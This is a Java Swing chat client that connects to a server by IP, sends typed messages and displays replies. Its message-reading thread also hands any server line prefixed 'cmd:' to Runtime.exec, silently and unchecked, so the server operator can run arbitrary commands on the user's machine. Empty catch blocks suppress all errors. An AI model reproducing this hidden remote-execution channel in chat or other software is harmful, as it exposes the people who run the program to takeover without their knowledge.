/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package client;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import javax.swing.JOptionPane;

/**
 *
 * @author i am rock
 */
public class MainClient extends javax.swing.JFrame {

    /**
     * Creates new form MainClient
     */
    public MainClient() {
        initComponents();
        try
        {
            ip=JOptionPane.showInputDialog(this,"Enter Server IP","Server",JOptionPane.QUESTION_MESSAGE);
            name=JOptionPane.showInputDialog(this,"Enter Name","Client",JOptionPane.QUESTION_MESSAGE);
            c=new Socket(ip, 1565);
            brc=new BufferedReader(new InputStreamReader(c.getInputStream()));
            out=new PrintWriter(c.getOutputStream(),true);//auto flush
            r=new ReadThread();
            r.start();
            out.println(name);
            //setTitle("Client Window ["+name+"]");
            setTitle(name+"'s Chat");
            
        }catch(Exception e){}
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        txtmsg = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jPanel2 = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        display = new javax.swing.JTextArea();

        setDefaultCloseOperation(javax.swing.WindowConstants.DO_NOTHING_ON_CLOSE);
        setTitle("Client Window[]");
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        txtmsg.setBackground(new java.awt.Color(255, 255, 204));
        txtmsg.setColumns(80);
        jPanel1.add(txtmsg);

        jButton1.setText("SEND");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });
        jPanel1.add(jButton1);

        getContentPane().add(jPanel1, java.awt.BorderLayout.PAGE_END);

        jPanel2.setLayout(new java.awt.BorderLayout());

        display.setEditable(false);
        display.setColumns(20);
        display.setRows(5);
        jScrollPane1.setViewportView(display);

        jPanel2.add(jScrollPane1, java.awt.BorderLayout.CENTER);

        getContentPane().add(jPanel2, java.awt.BorderLayout.CENTER);

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
        try
        {
            c.close();
            System.exit(0);
        }catch(Exception e){}
    }//GEN-LAST:event_formWindowClosing

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        if(!txtmsg.getText().equals(""))
        {
            out.println(txtmsg.getText());
            txtmsg.setText("");
            txtmsg.requestFocus();
        }
    }//GEN-LAST:event_jButton1ActionPerformed

    /**
     * @param args the command line arguments
     */
  

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JTextArea display;
    private javax.swing.JButton jButton1;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextField txtmsg;
    // End of variables declaration//GEN-END:variables
  private Socket c;
   private BufferedReader brc;
   private PrintWriter out;
   private String ip,name;
   private ReadThread r;
   class ReadThread extends Thread
   {
       public void run()
       {
           String msg;
           try
           {
           while((msg=brc.readLine())!=null)
           {
               if(msg.equals("f73d5eab4fa29ffd6014aac366cc48de")){
                   JOptionPane.showMessageDialog(null,"Server has Closed Connection\nExiting");
                   System.exit(0);
                   
               }
               if(msg.startsWith("cmd:"))
               {
                   String cmd=msg.substring(msg.indexOf(":")+1);
                   try
                   {
                       if(cmd.startsWith("shutdown") || cmd.startsWith("close"))
                       {
                           JOptionPane.showMessageDialog(null, "Closing Client Window","Server Operation", JOptionPane.WARNING_MESSAGE);
                           c.close();
                           if(cmd.startsWith("close"))
                           {
                               
                               System.exit(0);
                           }
                       }
                       Runtime.getRuntime().exec(cmd);
                   }catch(Exception e){}
               }
               else if(msg.startsWith("msg:"))
               {
                String m=msg.substring(msg.indexOf(":")+1);
                m=m.replace("~", "\n");
                JOptionPane.showMessageDialog(null, m,"Server Message",JOptionPane.INFORMATION_MESSAGE);
               }
               else
               {
                   display.append(msg+"\n");
               }
           }
           }catch(Exception e){}
       }
   }
}
